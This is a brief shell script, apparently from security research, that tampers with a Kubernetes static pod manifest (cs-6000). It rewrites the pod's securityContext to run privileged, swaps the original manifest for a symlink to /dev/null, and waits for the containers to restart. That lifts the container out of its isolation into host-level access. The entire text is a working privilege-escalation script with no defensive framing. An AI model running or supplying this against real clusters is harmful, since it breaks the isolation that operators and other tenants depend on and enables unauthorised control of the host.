#!/bin/sh
# wtm@offensi.com

# write new manifest
cat /etc/kubernetes/manifests/cs-6000.yaml | sed s/"'securityContext': \!\!null 'null'/\
'securityContext':\n\
\t'privileged': \!\!bool 'true'\n\
\t'procMount': \!\!null 'null'\n\
\t'runAsGroup': \!\!null 'null'\n\
\t'runAsUser': \!\!null 'null'\n\
\t'seLinuxOptions': \!\!null 'null'\n"/g > /tmp/cs-6000.yaml

# replace old manifest with symlink
rm -f /etc/kubernetes/manifests/cs-6000.yaml
ln -s /dev/null /etc/kubernetes/manifests/cs-6000.yaml
mv /tmp/cs-6000.yaml /etc/kubernetes/manifests/cs-6000-privileged-mode-enabled.yaml

# now wait for the containers to restart and reload your browser
